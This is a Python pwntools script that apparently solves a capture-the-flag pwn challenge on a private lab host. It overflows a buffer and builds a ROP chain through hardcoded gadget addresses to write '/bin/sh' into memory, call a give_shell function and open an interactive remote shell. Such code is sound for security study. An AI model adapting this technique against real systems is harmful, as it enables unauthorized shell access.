from pwn import *

r = remote("10.0.10.10", 5006)

context.log_level = "DEBUG"

r.recvuntil("Hahaha, there's no \"/bin/sh\" to save you now!\n")

# ROP chain construction

# padding for reaching the return address
padding = ("a" * 8) + ("a" * 8)

# Set RDI and RSI: jump to 0x400618 (helper) and place two values on the stack that it will consume:
#    8, to fill RSI: the "len" parameter to read_data
#    0x601050, to fill RDI: a pointer to our buffer space (where we will write "/bin/sh")
#          (helper)      (rsi=8)   (rdi=seemingly_useless_buffer)
stage1 = p64(0x400618) + p64(0x8) + p64(0x601050)

# Call read_data(seemingly_useless_buf, 8)
stage2 = p64(0x4005ee)

# Set RDI: jump to 0x400618 (helper) and place two values on the stack that it will consume:
#    0, to fill RSI (we don't care about its value)
#    0x601050, to fill RDI: a pointer to "/bin/sh"
#          (helper)      (rsi=0)   (rdi=seemingly_useless_buffer)
stage3 = p64(0x400618) + p64(0x0) + p64(0x601050)

# Call give_shell; because rdi = "/bin/sh", we are effectively calling give_shell("/bin/sh")
stage4 = p64(0x4005b7)

r.sendline(padding + stage1 + stage2 + stage3 + stage4)
r.sendline("/bin/sh")

r.interactive()
